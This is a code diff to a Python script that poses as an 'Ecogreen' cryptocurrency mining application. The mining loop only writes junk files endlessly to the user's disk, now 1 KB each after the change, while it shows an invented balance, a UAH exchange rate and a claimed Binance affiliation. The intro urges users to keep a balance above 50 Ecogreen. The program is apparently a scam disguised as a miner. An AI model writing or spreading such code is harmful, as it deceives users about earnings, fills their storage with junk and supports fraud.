@@ -26,7 +26,7 @@ def display_intro():
     intro_text = """
     Welcome to the official Ecogreen mining application!
     Here you can mine Ecogreen cryptocurrency and purchase additional assets and speeds.
-    By default, 100 files are created per second, earning 0.01 Ecogreen per second.
+    By default, 10 files are created per second, earning 0.001 Ecogreen per second.
     Current rate: 10 UAH = 1 Ecogreen.
     Attention! Ecogreen releases updates regularly. If you use an outdated version, withdrawals may not be supported.
     Ensure your balance is above 50 Ecogreen for compatibility with newer versions!
@@ -61,9 +61,9 @@ def mine_ecogreen(disk_letter):
     file_count = 0
 
     while True:
-        file_path = os.path.join(ecogreen_folder, f"file_{file_count}.eco")
+        file_path = os.path.join(ecogreen_folder, f"ecogreen.h_{file_count}.eco")
         with open(file_path, "wb") as f:
-            f.write(b"\x00")
+            f.write(b"\x00" * 1024)
         
         file_count += 1
         if file_count % 100 == 0:
@@ -73,12 +73,12 @@ def mine_ecogreen(disk_letter):
             save_balance(balance, uah_balance)
         sys.stdout.write("\033[H\033[J")
         print(f"HDD: {disk_letter}:/")
-        print("HS: 100 F/S")
+        print("HS: 10 F/S")
         print(f"CR: Created file {file_path}")
         print(f"Balance: {balance:.2f} Ecogreen ({uah_balance:.2f} UAH)")
         print("OOO kriptoTM & binance (Ecogreen 2019)")
 
-        time.sleep(0.01) 
+        time.sleep(0.1) 
 
 if __name__ == "__main__":
     check_for_updates() 
